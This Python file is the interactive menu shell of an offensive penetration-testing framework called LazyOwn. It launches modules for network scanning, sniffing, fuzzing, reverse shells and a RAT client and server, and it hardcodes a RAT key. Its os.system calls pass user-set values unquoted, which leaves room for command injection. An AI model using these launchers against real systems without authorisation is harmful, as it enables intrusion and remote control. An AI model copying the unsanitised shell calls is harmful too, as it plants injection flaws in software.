import os
import sys
import subprocess
import shlex
import signal
import json
from cmd import Cmd

BANNER = """
██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
[*] Iniciando: Framework [;,;]
"""
print(BANNER)

def signal_handler(sig, frame):
    global should_exit
    print("\n [<-] para salir usar el comando exit ...")
    should_exit = True

signal.signal(signal.SIGINT, signal_handler)

class LazyOwnShell(Cmd):
    prompt = "LazyOwn> "
    intro = "Welcome to the LazyOwn interactive shell! Type ? to list commands"

    def __init__(self):
        super().__init__()
        self.params = {
            "binary_name": None,
            "target_ip": "127.0.0.1",
            "api_key": None,
            "prompt": None,
            "url": None,
            "method": "GET",
            "headers": "{}",
            "params": "{}",
            "data": "{}",
            "json_data": "{}",
            "proxy_port": 8080,
            "wordlist": None,
            "hide_code": None,
            "mode": None,
            "attacker_ip": None,
            "reverse_shell_ip": None,
            "reverse_shell_port": None,
            "path":"/",
            "rhost": None,
            "lhost": None,
            "rport": 1337,
            "lport": 1337,
            "rat_key": "82e672ae054aa4de6f042c888111686a",
            "startip":"192.168.1.1",
            "endip":"192.168.1.254"
        }
        self.scripts = [
            "lazysearch",
            "lazysearch_gui",
            "lazyown",
            "update_db",
            "lazynmap",
            "lazynmapdiscovery",
            "lazygptcli",
            "lazyburpfuzzer",
            "lazymetaextract0r",
            "lazyreverse_shell",
            "lazyattack",
            "lazyownclient",
            "lazyownserver",
            "lazygath",
            "lazysniff",
            "lazynetbios"
        ]

    def do_set(self, line):
        """ Set a parameter value. Usage: set <parameter> <value> """
        args = shlex.split(line)
        if len(args) != 2:
            print("[?] Usage: set <parameter> <value>")
            return

        param, value = args
        if param in self.params:
            self.params[param] = value
            print(f"[SET] {param} set to {value}")
        else:
            print(f"[?] Unknown parameter: {param}")

    def do_show(self, line):
        """ Show the current parameter values """
        for param, value in self.params.items():
            print(f"{param}: {value}")

    def do_list(self, line):
        """ List all available scripts """
        print("Available scripts to run:")
        for script in self.scripts:
            print(f"- {script}")

    def do_run(self, line):
        """ Run a specific LazyOwn script """
        args = shlex.split(line)
        if not args:
            print("[?] Usage: run <script_name>")
            return

        script_name = args[0]
        if script_name in self.scripts:
            getattr(self, f"run_{script_name}")()
        else:
            print(f"Unknown script: {script_name}")

    def run_lazysearch(self):
        binary_name = self.params["binary_name"]
        if not binary_name:
            print("[?] binary_name not set")
            return
        self.run_script("modules/lazysearch.py", binary_name)

    def run_lazysearch_gui(self):
        self.run_script("modules/LazyOwnExplorer.py")

    def run_lazyown(self):
        self.run_script("modules/lazyown.py")

    def run_update_db(self):
        os.chdir("LazyOwn")
        os.system("rm *.csv")
        os.system("rm *.parquet")
        os.system("./modules/update_db.sh")
        os.chdir("..")

    def run_lazynmap(self):
        path = os.getcwd()
        target_ip = self.params["target_ip"]
        os.system(f"{path}/modules/lazynmap.sh -t {target_ip}")

    def run_lazygath(self):
        path = os.getcwd()
        os.system(f"sudo {path}/modules/lazygat.sh")

    def run_lazynmapdiscovery(self):
        path = os.getcwd()
        os.system(f"{path}/modules/lazynmap.sh -d")

    def run_lazysniff(self):
        env = os.environ.copy()
        env['LANG'] = 'en_US.UTF-8'
        env['TERM'] = 'xterm-256color'
        subprocess.run(["python3", "modules/lazysniff.py", "-i", "eth0"], env=env, stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr)

    def run_lazynetbios(self):
        
        startip = self.params["startip"]
        endip = self.params["endip"]
        subprocess.run(["python3", "modules/lazynetbios.py", startip, endip])

    def run_lazygptcli(self):
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print("[?] prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazygptcli.py", "--prompt", prompt)

    def run_lazymetaextract0r(self):
        path = self.params["path"]
        if not path:
            print("[?] path must be set")
            return
        self.run_script("modules/lazyown_metaextract0r.py", "--path", path)

    def run_lazyownclient(self):
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not lhost or not lport or not rat_key:
            print("[?] lhost and lport and rat_key must be set")
            return
        self.run_script("modules/lazyownclient.py", "--host", lhost, "--port", str(lport), "--key", rat_key)

    def run_lazyownserver(self):
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("[?] rhost and lport and rat_key must be set")
            return
        self.run_script("modules/lazyownserver.py", "--host", rhost, "--port", str(rport), "--key", rat_key)

    def run_lazyburpfuzzer(self):
        url = self.params["url"]
        method = self.params["method"]
        headers = self.params["headers"]
        params = self.params["params"]
        data = self.params["data"]
        json_data = self.params["json_data"]
        proxy_port = self.params["proxy_port"]
        wordlist = self.params["wordlist"]
        hide_code = self.params["hide_code"]

        command = [
            "python3", "modules/lazyown_bprfuzzer.py",
            "--url", url,
            "--method", method,
            "--headers", headers,
            "--params", params,
            "--data", data,
            "--json_data", json_data,
            "--proxy_port", str(proxy_port)
        ]
        if wordlist:
            command.extend(["-w", wordlist])
        if hide_code:
            command.extend(["-hc", str(hide_code)])

        self.run_command(command)

    def run_lazyreverse_shell(self):
        ip = self.params["reverse_shell_ip"]
        port = self.params["reverse_shell_port"]
        path = os.getcwd()
        if not ip or not port:
            print("[?] reverse_shell_ip and reverse_shell_port must be set")
            return
        os.system(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")

    def run_lazyattack(self):
        path = os.getcwd()
        mode = self.params["mode"]
        target_ip = self.params["target_ip"]
        attacker_ip = self.params["attacker_ip"]
        if not mode or not target_ip or not attacker_ip:
            print("[?] mode, target_ip, and attacker_ip must be set")
            return
        os.system(f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}")

    def run_script(self, script_name, *args):
        """ Run a script with the given arguments """
        command = ["python3", script_name] + [str(arg) for arg in args]
        self.run_command(command)

    def run_command(self, command):
        """ Run a command and print output in real-time """
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        try:
            for line in iter(process.stdout.readline, ''):
                print(line, end='')
            for line in iter(process.stderr.readline, ''):
                print(line, end='')
            process.stdout.close()
            process.stderr.close()
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print("\n[Interrupted] Process terminated")

    def do_payload(self, line):
        """ Load parameters from payload.json """
        try:
            with open("payload.json", "r") as f:
                data = json.load(f)
            for key, value in data.items():
                if key in self.params:
                    self.params[key] = value
            print("[*] Parameters loaded from payload.json")
        except FileNotFoundError:
            print("[?] payload.json not found")
        except json.JSONDecodeError:
            print("[?] Error decoding payload.json")

    def do_exit(self, line):
        """ Exit the LazyOwn shell """
        return True
    def do_fixperm(self, line):
        """ Exit the LazyOwn shell """
        print("[f] Fix script perm")
        os.system("chmod +x modules/*.sh")
if __name__ == "__main__":
    LazyOwnShell().cmdloop()
